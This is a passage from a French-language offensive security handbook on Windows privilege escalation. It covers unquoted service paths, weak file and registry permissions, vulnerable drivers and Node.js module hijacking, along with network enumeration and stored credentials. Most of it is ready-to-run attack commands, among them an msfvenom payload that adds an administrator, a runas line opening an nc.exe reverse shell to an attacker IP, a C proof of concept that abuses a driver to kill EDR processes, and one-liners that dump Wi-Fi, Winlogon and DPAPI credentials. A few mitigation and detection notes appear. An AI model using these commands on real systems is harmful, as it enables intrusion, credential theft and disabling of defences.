beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Permissions AppendData/AddSubdirectory du registre des Services

Si vous disposez de cette permission sur un registre, cela signifie que **vous pouvez créer des sous-registres à partir de celui-ci**. Dans le cas des services Windows, cela **suffit pour exécuter du code arbitraire :**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Si le chemin vers un exécutable n’est pas placé entre guillemets, Windows tentera d’exécuter chaque élément se terminant avant un espace.

Par exemple, pour le chemin _C:\Program Files\Some Folder\Service.exe_, Windows tentera d’exécuter :
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Répertoriez tous les chemins de services non placés entre guillemets, à l’exclusion de ceux appartenant aux services Windows intégrés :
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Vous pouvez détecter et exploiter** cette vulnérabilité avec metasploit : `exploit/windows/local/trusted\_service\_path` Vous pouvez créer manuellement un binaire de service avec metasploit :
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Actions de récupération

Windows permet aux utilisateurs de spécifier les actions à exécuter lorsqu’un service échoue. Cette fonctionnalité peut être configurée pour pointer vers un binaire. Si ce binaire peut être remplacé, une escalation de privilèges peut être possible. Plus de détails sont disponibles dans la [documentation officielle](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Applications

### Applications installées

Vérifiez les **permissions des binaires** (vous pouvez peut-être en écraser un et effectuer une escalation de privilèges) ainsi que celles des **dossiers** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Permissions d’écriture

Vérifiez si vous pouvez modifier un fichier de configuration afin de lire un fichier spécial, ou si vous pouvez modifier un binaire qui sera exécuté par un compte Administrator (schedtasks).

Pour rechercher les permissions faibles sur les dossiers/fichiers du système, utilisez :
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Persistance/exécution via l’auto-chargement d’un plugin Notepad++

Notepad++ charge automatiquement toute DLL de plugin située dans ses sous-dossiers `plugins`. Si une installation portable ou une copie accessible en écriture est présente, déposer un plugin malveillant permet l’exécution automatique de code dans `notepad++.exe` à chaque lancement, notamment depuis `DllMain` et les callbacks du plugin.

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Exécution au démarrage

**Vérifiez si vous pouvez écraser une entrée du registre ou un binaire qui sera exécuté par un autre utilisateur.**\
**Lisez** la **page suivante** pour en savoir plus sur les **emplacements d’autorun intéressants pour élever les privilèges** :


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Pilotes

Recherchez d’éventuels pilotes **tiers inhabituels/vulnérables**
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
Si un driver expose une primitive arbitraire de lecture/écriture du kernel (courante dans les gestionnaires IOCTL mal conçus), vous pouvez effectuer une élévation de privilèges en volant directement un token SYSTEM depuis la mémoire du kernel. Consultez la technique détaillée ici :

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

Pour les bugs de race condition où l’appel vulnérable ouvre un chemin Object Manager contrôlé par l’attaquant, ralentir délibérément la recherche (en utilisant des composants de longueur maximale ou des chaînes de répertoires profondes) peut étendre la fenêtre de quelques microsecondes à plusieurs dizaines de microsecondes :

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Primitives de corruption de mémoire des registry hives

Les vulnérabilités modernes des hives permettent de préparer des layouts déterministes, d’exploiter des descendants HKLM/HKU inscriptibles et de convertir la corruption de métadonnées en débordements du paged pool du kernel sans driver personnalisé. Découvrez la chaîne complète ici :

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Confusion de type en mode direct de `RtlQueryRegistryValues` à partir de chemins contrôlés par l’attaquant

Certains drivers acceptent un chemin de registre depuis le userland, vérifient uniquement qu’il s’agit d’une chaîne UTF-16 valide, puis appellent `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` avec `RTL_QUERY_REGISTRY_DIRECT` vers un scalaire sur la stack tel que `int readValue`. Si `RTL_QUERY_REGISTRY_TYPECHECK` est absent, `EntryContext` est interprété selon le type de registre **réel**, et non selon le type attendu par le développeur.

Cela crée deux primitives utiles :

- **Confused deputy / oracle** : un chemin absolu `\Registry\...` contrôlé par l’utilisateur permet au driver d’interroger des clés choisies par l’attaquant, de révéler leur existence via les codes de retour/logs et parfois de lire des valeurs auxquelles l’appelant ne pourrait pas accéder directement.
- **Corruption de mémoire du kernel** : une destination scalaire telle que `&readValue` est interprétée avec un type erroné comme `REG_QWORD`, `UNICODE_STRING` ou un buffer binaire de taille variable, selon le type de la valeur de registre.

Notes pratiques d’exploitation :

- **Mitigation Windows 8+** : si la requête atteint une **untrusted hive** avec `RTL_QUERY_REGISTRY_DIRECT` mais sans `RTL_QUERY_REGISTRY_TYPECHECK`, les appelants du kernel provoquent un crash avec `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Pour préserver l’exploitabilité, recherchez plutôt des clés contrôlées par l’attaquant dans des hives système de confiance, au lieu de placer les valeurs sous `HKCU`.
- **Mise en scène dans une trusted hive** : utilisez NtObjectManager pour énumérer les descendants inscriptibles de `\Registry\Machine`, puis relancez le scan avec un token **low-integrity** dupliqué afin de trouver les clés accessibles depuis des contextes sandboxés :
```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```
- **`REG_QWORD`** : une écriture directe de 8 octets dans un `int` de 4 octets corrompt les données adjacentes de la stack et peut écraser partiellement un callback/function pointer proche.
- **`REG_SZ` / `REG_EXPAND_SZ`** : le mode direct s’attend à ce que `EntryContext` pointe vers une `UNICODE_STRING`. Si le code charge d’abord un `REG_DWORD` contrôlé par l’attaquant dans un scalaire de la stack, puis réutilise ce même buffer pour une lecture de chaîne, l’attaquant contrôle `Length`/`MaximumLength` et influence partiellement le pointeur `Buffer`, ce qui produit une écriture kernel semi-contrôlée.
- **`REG_BINARY`** : pour les données binaires volumineuses, le mode direct traite le premier `LONG` à l’adresse `EntryContext` comme une taille de buffer signée. Si une lecture précédente de `REG_DWORD` laisse une valeur négative contrôlée par l’attaquant dans le scalaire réutilisé, la requête `REG_BINARY` suivante copie directement les octets de l’attaquant par-dessus les emplacements adjacents de la stack, ce qui constitue souvent le chemin le plus simple vers l’écrasement complet d’un callback-pointer.

Pattern de hunting particulièrement intéressant : **lectures de registre hétérogènes dans la même variable de la stack sans la réinitialiser**. Recherchez `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, les pointeurs `EntryContext` réutilisés et les chemins de code où la première lecture du registre contrôle l’exécution d’une seconde lecture.

#### Abusing missing FILE_DEVICE_SECURE_OPEN on device objects (LPE + EDR kill)

Certains drivers tiers signés créent leur device object avec un SDDL strict via IoCreateDeviceSecure, mais oublient de définir FILE_DEVICE_SECURE_OPEN dans DeviceCharacteristics. Sans ce flag, la DACL sécurisée n’est pas appliquée lorsque le device est ouvert via un chemin contenant un composant supplémentaire, ce qui permet à n’importe quel utilisateur non privilégié d’obtenir un handle en utilisant un namespace path tel que :

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (from a real-world case)

Une fois qu’un utilisateur peut ouvrir le device, les IOCTL privilégiés exposés par le driver peuvent être exploités pour effectuer une LPE et du tampering. Exemples de capacités observées in the wild :
- Retourner des handles avec un accès complet vers des processus arbitraires (vol de token / shell SYSTEM via DuplicateTokenEx/CreateProcessAsUser).
- Effectuer des opérations de raw disk read/write sans restriction (tampering offline, techniques de persistence au boot).
- Terminer des processus arbitraires, y compris les Protected Process/Light (PP/PPL), ce qui permet de kill l’AV/EDR depuis le user land via le kernel.

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Mitigations pour les développeurs
- Définissez toujours FILE_DEVICE_SECURE_OPEN lors de la création d’objets de périphérique destinés à être restreints par une DACL.
- Validez le contexte de l’appelant pour les opérations privilégiées. Ajoutez des vérifications PP/PPL avant d’autoriser l’arrêt d’un processus ou le retour de handles.
- Limitez les IOCTL (masques d’accès, METHOD_*, validation des entrées) et envisagez des modèles brokered plutôt que des privilèges directs au niveau du kernel.

Idées de détection pour les defenders
- Surveillez les ouvertures en user-mode de noms de périphériques suspects (par exemple, \\ .\\amsdk*) ainsi que les séquences spécifiques d’IOCTL indiquant un abus.
- Appliquez la vulnerable driver blocklist de Microsoft (HVCI/WDAC/Smart App Control) et maintenez vos propres listes d’autorisation et de blocage.


## PATH DLL Hijacking

Si vous avez des **permissions d’écriture dans un dossier présent dans PATH**, vous pourriez être en mesure de détourner une DLL chargée par un processus et **d’escalader vos privilèges**.

Vérifiez les permissions de tous les dossiers présents dans PATH :
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Pour plus d’informations sur la manière d’abuser de ce check :


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Détournement de la résolution des modules Node.js / Electron via `C:\node_modules`

Il s’agit d’une variante de **Windows uncontrolled search path** qui affecte les applications **Node.js** et **Electron** lorsqu’elles effectuent un import bare tel que `require("foo")` et que le module attendu est **absent**.

Node résout les packages en remontant l’arborescence et en vérifiant les dossiers `node_modules` de chaque parent. Sous Windows, cette recherche peut atteindre la racine du lecteur. Ainsi, une application lancée depuis `C:\Users\Administrator\project\app.js` peut finir par rechercher :

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Si un **utilisateur avec de faibles privilèges** peut créer `C:\node_modules`, il peut y déposer un fichier `foo.js` malveillant (ou un dossier de package), puis attendre qu’un **processus Node/Electron avec davantage de privilèges** tente de résoudre la dépendance manquante. Le payload s’exécute dans le contexte de sécurité du processus victime. Cela devient donc une **LPE** lorsque la cible s’exécute en tant qu’administrateur, depuis une scheduled task/wrapper de service avec élévation, ou depuis une application desktop privilégiée démarrée automatiquement.

Ce cas est particulièrement courant lorsqu’une :

- dépendance est déclarée dans `optionalDependencies`
- bibliothèque tierce encapsule `require("foo")` dans un `try/catch` et continue en cas d’échec
- package a été supprimé des builds de production, omis lors du packaging ou n’a pas été installé correctement
- instruction `require()` vulnérable se trouve profondément dans l’arbre des dépendances plutôt que dans le code principal de l’application

### Recherche de cibles vulnérables

Utilisez **Procmon** pour confirmer le chemin de résolution :

- Filtrez sur `Process Name` = exécutable cible (`node.exe`, l’EXE de l’application Electron ou le processus wrapper)
- Filtrez sur `Path` `contains` `node_modules`
- Concentrez-vous sur `NAME NOT FOUND` et sur l’ouverture réussie finale sous `C:\node_modules`

Patterns utiles lors de la code review de fichiers `.asar` unpacked ou des sources de l’application :
```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```
### Exploitation

1. Identifiez le **nom du package manquant** à partir de Procmon ou de la revue du code source.
2. Créez le répertoire de recherche racine s’il n’existe pas déjà :
```powershell
mkdir C:\node_modules
```
3. Déposez un module portant exactement le nom attendu :
```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```
4. Déclenchez l’application victime. Si l’application tente `require("foo")` et que le module légitime est absent, Node peut charger `C:\node_modules\foo.js`.

Des exemples réels de modules optionnels manquants qui correspondent à ce modèle incluent `bluebird` et `utf-8-validate`, mais la **technique** est la partie réutilisable : trouvez n’importe quel **import bare manquant** qu’un processus Windows Node/Electron privilégié va résoudre.

### Idées de détection et de hardening

- Déclenchez une alerte lorsqu’un utilisateur crée `C:\node_modules` ou y écrit de nouveaux fichiers/packages `.js`.
- Recherchez les processus à haute intégrité qui lisent depuis `C:\node_modules\*`.
- Incluez toutes les dépendances d’exécution dans la production et auditez l’utilisation de `optionalDependencies`.
- Examinez le code tiers à la recherche de modèles silencieux `try { require("...") } catch {}`.
- Désactivez les sondes optionnelles lorsque la bibliothèque le permet (par exemple, certains déploiements de `ws` peuvent éviter la sonde héritée `utf-8-validate` avec `WS_NO_UTF_8_VALIDATE=1`).

## Réseau

### Partages
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### fichier hosts

Vérifiez les autres ordinateurs connus codés en dur dans le fichier hosts
```
type C:\Windows\System32\drivers\etc\hosts
```
### Interfaces réseau et DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Ports ouverts

Vérifiez les **services restreints** depuis l’extérieur
```bash
netstat -ano #Opened ports?
```
### Table de routage
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### Table ARP
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Règles du pare-feu

[**Consultez cette page pour les commandes liées au pare-feu**](../basic-cmd-for-pentesters.md#firewall) **(lister les règles, créer des règles, désactiver, désactiver...)**

Plus de [commandes pour l'énumération réseau ici](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Le binaire `bash.exe` peut également se trouver dans `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Si vous obtenez l’utilisateur root, vous pouvez écouter sur n’importe quel port (la première fois que vous utilisez `nc.exe` pour écouter sur un port, une fenêtre GUI vous demandera si `nc` doit être autorisé par le firewall).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Pour démarrer facilement bash en tant que root, vous pouvez essayer `--default-user root`

Vous pouvez explorer le système de fichiers `WSL` dans le dossier `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Identifiants Windows

### Identifiants Winlogon
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Gestionnaire d’informations d’identification / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Le Windows Vault stocke les informations d’identification des utilisateurs pour les serveurs, les sites web et les autres programmes auxquels **Windows** peut **connecter automatiquement les utilisateurs**. À première vue, cela peut donner l’impression que les utilisateurs peuvent désormais stocker leurs identifiants Facebook, Twitter, Gmail, etc., afin de se connecter automatiquement via les navigateurs. Mais ce n’est pas le cas.

Le Windows Vault stocke les informations d’identification que Windows peut utiliser pour connecter automatiquement les utilisateurs, ce qui signifie que toute **application Windows nécessitant des informations d’identification pour accéder à une ressource** (un serveur ou un site web) **peut utiliser ce Credential Manager** et le Windows Vault, et utiliser les informations d’identification fournies au lieu que les utilisateurs saisissent constamment leur nom d’utilisateur et leur mot de passe.

À moins que les applications n’interagissent avec le Credential Manager, je ne pense pas qu’elles puissent utiliser les informations d’identification associées à une ressource donnée. Ainsi, si votre application veut utiliser le vault, elle doit d’une manière ou d’une autre **communiquer avec le credential manager et demander les informations d’identification pour cette ressource** au vault de stockage par défaut.

Utilisez `cmdkey` pour lister les informations d’identification stockées sur la machine.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Vous pouvez alors utiliser `runas` avec l’option `/savecred` afin d’utiliser les identifiants enregistrés. L’exemple suivant appelle un binaire distant via un partage SMB.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Utiliser `runas` avec des identifiants fournis.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Notez que mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), ou le [module Empire Powershells](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

La **Data Protection API (DPAPI)** fournit une méthode de chiffrement symétrique des données, principalement utilisée au sein du système d'exploitation Windows pour le chiffrement symétrique des clés privées asymétriques. Ce chiffrement utilise un secret utilisateur ou système afin de contribuer significativement à l'entropie.

**DPAPI permet de chiffrer les clés à l'aide d'une clé symétrique dérivée des secrets de connexion de l'utilisateur**. Dans les scénarios impliquant le chiffrement système, elle utilise les secrets d'authentification de domaine du système.

Les clés RSA utilisateur chiffrées à l'aide de DPAPI sont stockées dans le répertoire `%APPDATA%\Microsoft\Protect\{SID}`, où `{SID}` représente l'[identificateur de sécurité](https://en.wikipedia.org/wiki/Security_Identifier) de l'utilisateur. **La clé DPAPI, stockée avec la clé principale qui protège les clés privées de l'utilisateur dans le même fichier**, se compose généralement de 64 octets de données aléatoires. (Notez que l'accès à ce répertoire est restreint, ce qui empêche d'en afficher le contenu avec la commande `dir` dans CMD, mais il peut être listé via PowerShell.)
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Vous pouvez utiliser le **mimikatz module** `dpapi::masterkey` avec les arguments appropriés (`/pvk` ou `/rpc`) pour le déchiffrer.

Les **fichiers d’identifiants protégés par le mot de passe principal** se trouvent généralement dans :
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Vous pouvez utiliser le **mimikatz module** `dpapi::cred` avec le `/masterkey` approprié pour déchiffrer.\
Vous pouvez **extraire de nombreuses** **masterkeys DPAPI** depuis la **mémoire** avec le module `sekurlsa::dpapi` (si vous êtes root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

Les **PowerShell credentials** sont souvent utilisés pour le **scripting** et les tâches d’automatisation, afin de stocker facilement des credentials chiffrés. Les credentials sont protégés à l’aide de **DPAPI**, ce qui signifie généralement qu’ils ne peuvent être déchiffrés que par le même utilisateur sur le même ordinateur que celui sur lequel ils ont été créés.

Pour **déchiffrer** des PS credentials depuis le fichier qui les contient, vous pouvez utiliser :
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Connexions RDP enregistrées

Vous pouvez les trouver dans `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
et dans `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Commandes exécutées récemment
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Gestionnaire d’identifiants du Bureau à distance**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Utilisez le module `dpapi::rdg` de **Mimikatz** avec le `/masterkey` approprié pour **déchiffrer tous les fichiers .rdg**\
Vous pouvez **extraire de nombreuses masterkeys DPAPI** de la mémoire avec le module `sekurlsa::dpapi` de Mimikatz

### Sticky Notes

Les utilisateurs se servent souvent de l’application Sticky Notes sur les postes de travail Windows pour **enregistrer des mots de passe** et d’autres informations, sans réaliser qu’il s’agit d’un fichier de base de données. Ce fichier se trouve dans `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` et il vaut toujours la peine de le rechercher et de l’examiner.

### AppCmd.exe

**Notez que pour récupérer les mots de passe depuis AppCmd.exe, vous devez être Administrateur et exécuter le processus avec un niveau d’intégrité élevé.**\
**AppCmd.exe** se trouve dans le répertoire `%systemroot%\system32\inetsrv\`.\
Si ce fichier existe, il est possible que des **identifiants** aient été configurés et puissent être **récupérés**.

Ce code a été extrait de [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) :
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Vérifiez si `C:\Windows\CCM\SCClient.exe` existe .\
Les installateurs sont **exécutés avec les privilèges SYSTEM**, et beaucoup sont vulnérables au **DLL Sideloading (informations provenant de** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Fichiers et registre (identifiants)

### Identifiants PuTTY
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Clés d'hôte SSH de Putty
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### Clés SSH dans le registre

Les clés privées SSH peuvent être stockées dans la clé de registre `HKCU\Software\OpenSSH\Agent\Keys`; vous devriez donc vérifier si elle contient quelque chose d'intéressant :
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Si vous trouvez une entrée dans ce chemin, il s’agit probablement d’une clé SSH enregistrée. Elle est stockée chiffrée, mais peut être facilement déchiffrée à l’aide de [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Plus d’informations sur cette technique ici : [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Si le service `ssh-agent` n’est pas en cours d’exécution et que vous voulez qu’il démarre automatiquement au démarrage, exécutez :
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Il semble que cette technique ne soit plus valide. J’ai essayé de créer des clés SSH, de les ajouter avec `ssh-add` et de me connecter via SSH à une machine. La clé de registre HKCU\Software\OpenSSH\Agent\Keys n’existe pas et procmon n’a pas identifié l’utilisation de `dpapi.dll` lors de l’authentification par clé asymétrique.

### Fichiers Unattended
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
